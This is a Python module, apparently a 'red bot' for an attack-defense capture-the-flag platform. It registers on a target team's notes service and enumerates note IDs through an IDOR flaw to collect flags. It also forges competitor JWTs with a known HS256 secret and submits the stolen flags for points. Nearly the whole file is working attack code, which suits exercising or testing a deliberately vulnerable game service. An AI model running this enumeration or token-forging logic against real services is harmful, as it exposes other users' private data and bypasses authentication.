"""레드 봇 — A/D 공격: 타깃 팀의 Vulnerable Notes(IDOR)로 현재 라운드 플래그를 탈취해 제출.

공격 경로(라이브 검증됨):
  1) 타깃 게이트웨이(host:910X)의 notes 서비스에 계정 등록·로그인.
  2) GET /api/notes/{id} IDOR(소유권 미검증)로 note 를 훑어 FLAG{...} 수집(최신 id 우선).
  3) 자기 팀 competitor JWT(team_id·match_id 클레임, AUTH_JWT_SECRET HS256)로
     POST /matches/{id}/flags/submit → 엔진이 현재 유효 플래그만 accepted.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import time

import requests

from . import common as C

FLAG_RE = re.compile(r"FLAG\{[^}]+\}")


def mint_competitor(team_id: str, match_id: str, secret: str) -> str:
    """competitor JWT 발급(loadtest/k6/bootstrap_ad.py 와 동일 HS256 방식)."""
    def b64(d: bytes) -> str:
        return base64.urlsafe_b64encode(d).rstrip(b"=").decode()
    header = {"alg": "HS256", "typ": "JWT"}
    now = int(time.time())
    payload = {"iat": now, "exp": now + 3600, "type": "access",
               "sub": f"red-{team_id}", "role": "competitor",
               "team_id": team_id, "match_id": match_id}
    seg = [b64(json.dumps(header, separators=(",", ":")).encode()),
           b64(json.dumps(payload, separators=(",", ":")).encode())]
    sig = hmac.new(secret.encode(), ".".join(seg).encode(), hashlib.sha256).digest()
    seg.append(b64(sig))
    return ".".join(seg)


def steal_flags(target_url: str, scan_ids: int = 40) -> list[tuple[int, str]]:
    """타깃 notes 에 로그인해 IDOR 로 note 를 훑어 (note_id, flag) 목록 수집."""
    user = f"red{int(time.time()*1000) % 10_000_000}"
    pw = "redbot-pw-123456"
    requests.post(f"{target_url}/api/register",
                  json={"username": user, "password": pw}, timeout=6)
    tok = requests.post(f"{target_url}/api/login",
                        json={"username": user, "password": pw},
                        timeout=6).json().get("access_token", "")
    found: list[tuple[int, str]] = []
    for nid in range(1, scan_ids + 1):
        try:
            body = requests.get(f"{target_url}/api/notes/{nid}",
                                headers={"Authorization": f"Bearer {tok}"},
                                timeout=4).text
        except requests.RequestException:
            continue
        for f in FLAG_RE.findall(body):
            found.append((nid, f))
    return found


def attack_and_submit(attacker_team: str, target_url: str, match_id: str,
                      secret: str) -> dict:
    """타깃에서 플래그를 탈취해 자기 팀 명의로 제출. 수락 건수/점수 반환."""
    token = mint_competitor(attacker_team, match_id, secret)
    flags = steal_flags(target_url)
    accepted, delta = 0, 0
    for nid, flag in sorted(set(flags), reverse=True):  # 최신 id 우선
        try:
            r = requests.post(
                f"{C.AD_API}/api/attack-defense/matches/{match_id}/flags/submit",
                headers={"Authorization": f"Bearer {token}"},
                json={"flag": flag}, timeout=8).json()
        except requests.RequestException:
            continue
        if r.get("accepted"):
            accepted += 1
            delta += r.get("score_delta") or 0
    return {"stolen": len(set(flags)), "accepted": accepted, "score_delta": delta}
